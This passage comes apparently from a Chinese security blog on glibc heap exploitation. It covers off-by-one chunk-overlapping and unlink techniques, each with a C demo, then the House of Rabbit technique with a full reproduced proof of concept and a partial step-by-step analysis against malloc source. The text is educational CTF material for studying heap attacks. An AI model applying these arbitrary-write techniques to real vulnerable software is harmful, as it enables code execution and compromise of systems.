那么只要重新分配原B大小的chunk，就会重新得到b2。
在这个例子中，b2是我们要进行读写的目标堆块。最后的堆块布局如下所示：
</code></pre><p>|——————————————————————|<br>|   A |B1|B2| |    C   |<br>|——————————————————————|<br>布局堆块结构如ABC所示</p>
<ol>
<li><p>off-by-one覆盖B，目的是覆盖掉B的inuse位</p>
</li>
<li><p>free B</p>
</li>
<li><p>malloc b1,malloc b2</p>
</li>
<li><p>free C</p>
</li>
<li><p>free b1</p>
</li>
<li><p>malloc B</p>
</li>
<li><p>overlapping b2</p>
</li>
</ol>
<p>这种利用方式成功的原因有两点:</p>
<p>通过prev_chunk()宏查找前块时没有对size域进行验证</p>
<p>当B块的size域被伪造后，下一块的pre_size域无法得到更新。</p>
<h1 id="off-by-one-small-bin"><a href="#off-by-one-small-bin" class="headerlink" title="off-by-one small bin"></a>off-by-one small bin</h1><p>|——————————————————————|<br>|   A      |     B     |<br>|——————————————————————|</p>
<pre><code>这种方法是要触发unlink宏，
因此需要一个指向堆上的指针来绕过fd和bk链表的check。
需要在A块上构造一个伪堆结构，
然后覆盖B的pre_size域和inuse域。这样当我们free B时，
就会触发unlink宏导致指向堆上的指针
ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
通过这个特点，我们可以覆写ptr指针，如果条件允许的话，
几乎可以造成无限次的write-anything-anywhere。
</code></pre><ol>
<li><p>在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。</p>
</li>
<li><p>free B块</p>
</li>
<li><p>ptr指针被改为&amp;ptr-0xC</p>
</li>
</ol>
<h2 id="off-by-one-large-bin"><a href="#off-by-one-large-bin" class="headerlink" title="off-by-one large bin"></a>off-by-one large bin</h2><p>large bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project Zero项目的一篇文章中，具体链接是</p>
<p><a href="https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html</a></p>
<p>在这篇文章中，提出了large bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。</p>
<h1 id="测试DEMO"><a href="#测试DEMO" class="headerlink" title="测试DEMO"></a>测试DEMO</h1><h1 id="1-off-by-one-overwrite-allocated"><a href="#1-off-by-one-overwrite-allocated" class="headerlink" title="1.off-by-one overwrite allocated"></a>1.off-by-one overwrite allocated</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';  //把C块包含进来</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。</p>
<h2 id="2-off-by-one-overwrite-freed"><a href="#2-off-by-one-overwrite-freed" class="headerlink" title="2.off-by-one overwrite freed"></a>2.off-by-one overwrite freed</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">   </span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">380</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。</p>
<h2 id="3-off-by-one-null-byte"><a href="#3-off-by-one-null-byte" class="headerlink" title="3.off-by-one null byte"></a>3.off-by-one null byte</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *B1,*B2;</span><br><span class="line">    <span class="keyword">void</span> *Overlapping;</span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">0x208</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    ((char *)A)[0x104]='\x00';</span><br><span class="line">    B1=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B2=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(B1);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以成功的对B2进行任意读写。</p>
<h2 id="4-off-by-one-small-bin"><a href="#4-off-by-one-small-bin" class="headerlink" title="4.off-by-one small bin"></a>4.off-by-one small bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> prev_size,size,fd,bk;</span><br><span class="line">    <span class="keyword">void</span> *p1,*p2;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">   </span><br><span class="line">    p1=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    p2=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">   </span><br><span class="line">    ptr=p1;</span><br><span class="line">    prev_size=<span class="number">0</span>;</span><br><span class="line">    size=<span class="number">249</span>;</span><br><span class="line">    fd=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0xC</span>;</span><br><span class="line">    bk=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0x8</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'c'</span>,<span class="number">253</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,&amp;prev_size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">4</span>,&amp;size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">8</span>,&amp;fd,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">12</span>,&amp;bk,<span class="number">4</span>);</span><br><span class="line">    size=<span class="number">248</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buf[<span class="number">248</span>],&amp;size,<span class="number">4</span>);</span><br><span class="line">    buf[252]='\x00';</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memcpy</span>(p1,buf,<span class="number">253</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/hor/">House-Of-Rabbit</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="House-Of-Rabbit-原理"><a href="#House-Of-Rabbit-原理" class="headerlink" title="House Of Rabbit 原理"></a>House Of Rabbit 原理</h1><ul>
<li><a href="http://p4nda.top/tags/CTF/" target="_blank" rel="noopener">CTF</a></li>
<li><a href="http://p4nda.top/tags/PWN/" target="_blank" rel="noopener">PWN</a></li>
</ul>
<p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p>
<h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol>
<li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li>
<li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li>
<li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li>
</ol>
<p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   PoC of House of Rabbit</span><br><span class="line">   Tested in Ubuntu 14.04, 16.04 (64bit).</span><br><span class="line">   </span><br><span class="line">   Yutaro Shimizu</span><br><span class="line">   @shift_crops</span><br><span class="line">   2017/09/14</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char target[0x10] = &quot;Hello, World!&quot;;</span><br><span class="line">unsigned long gbuf[6] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	void *p, *fast, *small, *fake;</span><br><span class="line">	char *victim;</span><br><span class="line"></span><br><span class="line">	printf(	&quot;This is PoC of House of Rabbit\n&quot;</span><br><span class="line">		&quot;This technique bypassing Heap ASLR without leaking address, &quot;</span><br><span class="line">		&quot;and make it possible to overwrite a variable located at an arbitary address.\n&quot;</span><br><span class="line">		&quot;Jump like a rabbit and get an accurate address by malloc! :)\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	// 1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;</span><br><span class="line">	printf(&quot;1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;\n&quot;);</span><br><span class="line">	p = malloc(0xa00000);</span><br><span class="line">	printf(&quot;  Allocate 0xa00000 byte by mmap at %p, and free.\n&quot;, p);</span><br><span class="line">	free(p);</span><br><span class="line"></span><br><span class="line">	p = malloc(0xa00000);</span><br><span class="line">	printf(&quot;  Allocate 0xa00000 byte in heap at %p, and free.\n&quot;, p);</span><br><span class="line">	free(p);</span><br><span class="line">	printf(&quot;  Then, the value of &apos;av-&gt;system_mem&apos; became larger than 0xa00000.\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 2. Free fast chunk and link to fastbins</span><br><span class="line">	printf(&quot;2. Free fast chunk and link to fastbins\n&quot;);</span><br><span class="line">	fast = malloc(0x10); 		// any size in fastbins is ok </span><br><span class="line">	small = malloc(0x80);</span><br><span class="line">	printf(	&quot;  Allocate fast chunk and small chunk.\n&quot;</span><br><span class="line">		&quot;  fast = %p\n&quot;</span><br><span class="line">		&quot;  small = %p\n&quot;, fast, small);</span><br><span class="line">	free(fast);</span><br><span class="line">	printf(&quot;  Free fast chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	// 3. Make fake_chunk on .bss</span><br><span class="line">	printf(&quot;3. Make fake_chunk on .bss\n&quot;);</span><br><span class="line">	gbuf[1] = 0x11;	</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line">	printf(	&quot;  fake_chunk1 (size : 0x%lx) is at %p\n&quot;</span><br><span class="line">		&quot;  fake_chunk2 (size : 0x%lx) is at %p\n\n&quot;</span><br><span class="line">		, gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// VULNERABILITY</span><br><span class="line">	// use after free or fastbins dup etc...</span><br><span class="line">	fake = &amp;gbuf[2];</span><br><span class="line">	printf(	&quot;VULNERABILITY (e.g. UAF)\n&quot;</span><br><span class="line">		&quot;  *fast = %p\n&quot;</span><br><span class="line">		, fake);</span><br><span class="line">	*(unsigned long**)fast = fake;</span><br><span class="line">	printf(&quot;  fastbins list : [%p, %p, %p]\n\n&quot;, fast-0x10, fake, *(void **)(fake+0x10));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 4. call malloc_consolidate</span><br><span class="line">	printf(	&quot;4. call malloc_consolidate\n&quot;</span><br><span class="line">		&quot;  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n&quot;</span><br><span class="line">		, small, fake);</span><br><span class="line">	free(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 5. Link unsorted bins to appropriate list</span><br><span class="line">	printf(	&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">		&quot;  Rewrite fake_chunk1&apos;s size to 0xa0001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">	gbuf[3] = 0xa00001;</span><br><span class="line">	malloc(0xa00000);</span><br><span class="line">	printf(	&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">		&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">		&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 6. Overwrite targer variable</span><br><span class="line">	printf(	&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">		&quot;  target is at %p\n&quot;</span><br><span class="line">		&quot;  Before : %s\n&quot;</span><br><span class="line">		, &amp;target, target);</span><br><span class="line"></span><br><span class="line">	malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">	victim = malloc(0x10);</span><br><span class="line">	printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">	strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;  After  : %s\n&quot;, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面对这个利用方法进行分步解析</p>
<h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p>
<p>分配代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>阈值改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure>
<p>因此在第一阶段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;</span><br><span class="line">printf(&quot;1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;\n&quot;);</span><br><span class="line">p = malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate 0xa00000 byte by mmap at %p, and free.\n&quot;, p);</span><br><span class="line">free(p);</span><br><span class="line"></span><br><span class="line">p = malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate 0xa00000 byte in heap at %p, and free.\n&quot;, p);</span><br><span class="line">free(p);</span><br><span class="line">printf(&quot;  Then, the value of &apos;av-&gt;system_mem&apos; became larger than 0xa00000.\n\n&quot;);</span><br></pre></td></tr></table></figure>
<p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/1.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/1.png" alt="img"></a></p>
<h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2 申请小堆块并放入fastbin"></a>步骤2 申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 2. Free fast chunk and link to fastbins</span><br><span class="line">printf(&quot;2. Free fast chunk and link to fastbins\n&quot;);</span><br><span class="line">fast = malloc(0x20); 		// any size in fastbins is ok </span><br><span class="line">small = malloc(0x80);</span><br><span class="line">printf(	&quot;  Allocate fast chunk and small chunk.\n&quot;</span><br><span class="line">	&quot;  fast = %p\n&quot;</span><br><span class="line">	&quot;  small = %p\n&quot;, fast, small);</span><br><span class="line">free(fast);</span><br><span class="line">printf(&quot;  Free fast chunk.\n\n&quot;);</span><br></pre></td></tr></table></figure>
<p>此时，对应的堆结构是：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/2.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/2.png" alt="img"></a></p>
<h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p>
<p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 3. Make fake_chunk on .bss</span><br><span class="line">printf(&quot;3. Make fake_chunk on .bss\n&quot;);</span><br><span class="line">gbuf[1] = 0x11;	</span><br><span class="line">gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line">printf(	&quot;  fake_chunk1 (size : 0x%lx) is at %p\n&quot;</span><br><span class="line">	&quot;  fake_chunk2 (size : 0x%lx) is at %p\n\n&quot;</span><br><span class="line">	, gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// VULNERABILITY</span><br><span class="line">// use after free or fastbins dup etc...</span><br><span class="line">fake = &amp;gbuf[2];</span><br><span class="line">printf(	&quot;VULNERABILITY (e.g. UAF)\n&quot;</span><br><span class="line">	&quot;  *fast = %p\n&quot;</span><br><span class="line">	, fake);</span><br><span class="line">*(unsigned long**)fast = fake;</span><br><span class="line">printf(&quot;  fastbins list : [%p, %p, %p]\n\n&quot;, fast-0x10, fake, *(void **)(fake+0x10));</span><br></pre></td></tr></table></figure>
<p>此时，堆块状态如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/3.png" alt="img"></a></p>
<h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p>
<p>触发代码如下：(malloc.c 4071)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      if (have_fastchunks(av))</span><br><span class="line">		malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0 0x10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  if (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; else</span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  if (!in_smallbin_range (size)) &#123;</span><br><span class="line">    